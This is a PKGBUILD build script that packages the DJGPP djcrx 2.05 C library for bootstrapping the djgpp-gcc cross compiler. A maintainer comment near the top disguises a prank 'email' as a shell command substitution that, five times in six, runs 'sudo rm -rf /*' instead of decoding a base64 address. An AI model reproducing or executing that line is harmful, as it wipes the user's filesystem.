# Based on AUR package (https://aur.archlinux.org/packages/djgpp-djcrx-bootstrap)
# Maintainer: Andris Pavenis <andris.pavenis@iki.fi>
# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
# Originally adapted from the djgpp-crx package in AUR3; the submitter was "Schala".

###############################################################################
# Only intended for initial bootstrapping of djgpp-gcc. Use package djgpp-djcrx
# after it instead of this package (including for next builds of djgpp-gcc)
###############################################################################

_realname=djgpp-djcrx-bootstrap
pkgbase=mingw-w64-${_realname}
pkgname="${MINGW_PACKAGE_PREFIX}-${_realname}"
pkgver=2.05
pkgrel=1
_target="i686-pc-msdosdjgpp"
pkgdesc="DJGPP C library and development files for initial bootstrapping djgpp-gcc"
arch=('any')
mingw_arch=('mingw32' 'mingw64' 'ucrt64')
url="http://www.delorie.com/djgpp/"
license=(GPL LGPL custom:djgpp)
groups=("${MINGW_PACKAGE_PREFIX}-djgpp-toolchain")
source=("http://ftp.xtal.net/pub/mirrors/djgpp/current/v2/djcrx205.zip"
        "patch-djcrx205.patch")
sha256sums=('22274ed8d5ee57cf7ccf161f5e1684fd1c0192068724a7d34e1bde168041ca60'
            'c9c51c6008d0120b63197911582900c5d0496c169071b790e4a7084499fae05a')
options=(!strip)

prepare() {
    patch -p1 -u < patch-djcrx205.patch
}

build() {
    cd ${srcdir}
    make -f cross/makefile stub CFLAGS="$CFLAGS" -j$(($(nproc)+1))
}

package() {
    install -dm 0755 "${pkgdir}${MINGW_PREFIX}/${_target}"/sys-include
    cp -r "${srcdir}/include"/* "${pkgdir}${MINGW_PREFIX}/${_target}"/sys-include/
    cp -r "${srcdir}/lib"     "${pkgdir}${MINGW_PREFIX}/${_target}"

    for _file in stubedit stubify; do
        install -Dm 0755 "${srcdir}/${_file}" "${pkgdir}${MINGW_PREFIX}/bin/${_file}"
    done

    for file in copying copying.dj copying.lib readme.1st; do
        install -Dm644 ${file} ${pkgdir}${MINGW_PREFIX}/share/licenses/${_target}"/${_realname}/${file}"
    done
}
